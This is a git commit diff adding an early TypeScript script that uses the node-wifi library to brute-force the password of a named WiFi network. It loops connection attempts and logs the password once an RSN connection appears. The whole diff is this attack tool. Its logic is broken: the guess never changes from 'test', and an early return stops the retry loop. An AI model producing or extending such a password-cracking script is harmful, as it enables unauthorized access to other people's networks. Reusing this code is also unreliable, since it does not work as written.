f747651504b3e9009b6c15e44b849902e868f89e
Jordy Yeoman <jordyyeoman@gmail.com>
2024-06-16 19:59:13 +0800

    feat: basic eg

--- bruteForce/index.ts
+++ bruteForce/index.ts
@@ -1,33 +1,64 @@
 import wifi from 'node-wifi';
 
-const ssidToConnectTo = 'blah blah';
+const ssidToConnectTo = 'TestNetwork-2B';
+let hasSuccessfullyConnected = false;
+let totalAttempts = 1;
+let iteration = 9999;
+let currPasswordAttempt = 'test';
+
 console.log('BruteForce Starting on WiFi ssid:', ssidToConnectTo);
 
 wifi.init({
   iface: null,
 });
 
-wifi.scan((error, networks) => {
-  if (error) {
-    console.log(error);
-  } else {
-    console.log(networks);
-    /*
-        networks = [
-            {
-              ssid: '...',
-              bssid: '...',
-              mac: '...', // equals to bssid (for retrocompatibility)
-              channel: <number>,
-              frequency: <number>, // in MHz
-              signal_level: <number>, // in dB
-              quality: <number>, // same as signal level but in %
-              security: 'WPA WPA2' // format depending on locale for open networks in Windows
-              security_flags: '...' // encryption protocols (format currently depending of the OS)
-              mode: '...' // network mode like Infra (format currently depending of the OS)
-            },
-            ...
-        ];
-        */
+const handleExit = () => {
+  // @ts-ignore
+  process.exit(0);
+};
+
+const attemptConnection = () => {
+  console.log('Total Attempts: ', totalAttempts);
+  console.log('Iteration: ', iteration);
+  totalAttempts++;
+
+  // Attempt a connection
+  wifi.connect({ ssid: ssidToConnectTo, password: currPasswordAttempt }, () => {
+    console.log('Attempt tried');
+  });
+
+  // List the current wifi connections
+  let messageReturnedYet = false;
+  wifi.getCurrentConnections((error, currentConnections) => {
+    console.log('Houston, we have a message: ');
+    messageReturnedYet = true;
+
+    if (error) {
+      console.log(error);
+      handleExit();
+    } else {
+      console.log('currentConnections: ', currentConnections);
+
+      const hasRSNSecurity = currentConnections.some((conn) =>
+        conn.security.includes('RSN')
+      );
+
+      if (currentConnections.length > 0 && hasRSNSecurity) {
+        console.log('Connection established!!');
+        console.log('Password attempted: ', currPasswordAttempt);
+        hasSuccessfullyConnected = true;
+        handleExit();
+        return;
+      }
+    }
+  });
+
+  while (!messageReturnedYet) {
+    return;
   }
-});
+
+  iteration--;
+  attemptConnection();
+};
+
+attemptConnection();
